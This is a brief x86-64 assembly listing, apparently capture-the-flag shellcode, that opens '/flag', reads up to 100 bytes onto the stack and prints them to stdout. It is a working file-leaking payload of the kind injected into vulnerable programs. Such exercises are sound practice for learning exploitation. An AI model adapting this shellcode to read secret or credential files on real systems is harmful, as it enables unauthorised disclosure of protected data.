.intel_syntax noprefix
.global _start

_start:
   mov rax, 0x02
   lea rdi, [rip+flag]
   mov rsi, 0x0
   mov rdx, 0x0
   syscall

   mov rdi, rax
   xor rax, rax
   mov rdx, 100
   mov rsi, rsp
   syscall

   mov rax, 0x01
   mov rdi, 0x01
   mov rsi, rsp
   mov rdx, 100
   syscall
   
flag:
   .ascii "/flag"